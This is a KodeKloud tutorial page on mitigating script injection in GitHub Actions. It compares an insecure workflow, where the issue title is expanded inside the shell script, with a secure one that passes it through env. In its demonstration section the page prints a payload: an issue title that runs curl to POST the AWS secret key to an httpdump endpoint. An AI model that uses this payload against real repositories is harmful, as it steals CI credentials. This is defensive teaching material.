# Mitigating Script Injection Attack - KodeKloud Notes

[Source URL](https://notes.kodekloud.com/docs/GitHub-Actions/Security-Guide/Mitigating-Script-Injection-Attack)

---

## Table of Contents

- Mitigating Script Injection Attack
  - Insecure Example
  - Secure Approach
  - Insecure vs. Secure Comparison
  - Demonstration of Attack Mitigation
  - Further Reading
  - References
  - Watch Video
    - Workflow Logs
    - HTTP Dump Confirmation

---

## Content

GitHub Actions

Security Guide

# Mitigating Script Injection Attack

Script injection occurs when untrusted input is interpolated directly into shell commands, allowing attackers to execute arbitrary code. In GitHub Actions workflows, inline shell scripts are especially susceptible if values like issue titles or user inputs are expanded before execution. This guide shows how to move untrusted data into environment variables, ensuring it’s parsed at runtime rather than baked into your script.

## Insecure Example

> [!important]
> **Warning**
>
> Interpolating untrusted input inside the `run` block lets attackers inject arbitrary commands.
> Never build shell scripts by concatenating or expanding variables directly in the script body.

```
name: Label Issues (Script Injection)

on:
  issues:
    types: [opened]

jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1
      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          # Unsafe: github.event.issue.title is expanded into the script
          issue_title="{{ github.event.issue.title }}"
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG.........."
          else
            echo "Not a bug"
          fi
```

## Secure Approach

By passing untrusted input via the `env` block, the value is provided to the shell at execution time rather than expanded when the workflow is generated.

> [!important]
> **Note**
>
> Defining `issue_title` as an environment variable prevents any injected payload from being interpreted as part of the script.
> The shell will see it only as data.

```
name: Label Issues (Script Injection)

on:
  issues:
    types: [opened]

jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1

      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          issue_title: '${{ github.event.issue.title }}'
        run: |
          # Safe: issue_title is injected at runtime
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG .................."
          else
            echo "Not a bug"
          fi
```

## Insecure vs. Secure Comparison

| Aspect             | Insecure Workflow                                | Secure Workflow                                  |
| ------------------ | ------------------------------------------------ | ------------------------------------------------ |
| Expansion point    | Inline script (`run` block)                      | Environment variable (`env` block)               |
| Vulnerability      | Shell interprets injected characters as commands | Shell treats the entire value as a string        |
| Example assignment | `issue_title="{{ github.event.issue.title }}"`   | `issue_title: '${{ github.event.issue.title }}'` |

## Demonstration of Attack Mitigation

Simulate an issue title containing a malicious payload:

```
# Simulated payload in the issue title:
# bug'; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/XYZ
```

### Workflow Logs

```
Run if [[ "$issue_title" == *"bug"* ]]; then
  if [[ "$issue_title" == *"bug"* ]]; then
    echo "Issue is about a bug!"
    echo "Assigning Label - BUG …"
  else
    echo "Not a bug"
  fi
fi
shell: /usr/bin/bash -e {0}
env:
  AWS_SECRET_ACCESS_KEY: ***
  issue_title: bug'; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/XYZ
```

```
if [[ "$issue_title" == *"bug"* ]]; then
    echo "Issue is about a bug!"
    echo "Assigning Label - BUG …. …. …. …. .."
else
    echo "Not a bug"
fi
```

**Output:**

```
Issue is about a bug!
Assigning Label - BUG …. …. …. …. ..
```

No external `curl` request is executed—only the intended logic runs.

### HTTP Dump Confirmation

Inspecting the HTTP dump shows only the initial probe requests, confirming no secrets were exfiltrated:

```
HEAD /dumps/XYZ
POST /dumps/XYZ
```

## Further Reading

- [Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
- [Workflow syntax for GitHub Actions](https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions)

## References

- GitHub Actions Documentation: https://docs.github.com/actions
- OWASP Cheat Sheet: Command Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Command\_Injection\_Prevention\_Cheat\_Sheet.html

> [!important]
> **## [Watch Video](https://learn.kodekloud.com/user/courses/github-actions/module/48b4f34c-9ebb-4049-baa1-40490c46d2eb/lesson/64b867e5-af65-449a-a8ee-bfccfb5aa10b)**
>
> Watch video content
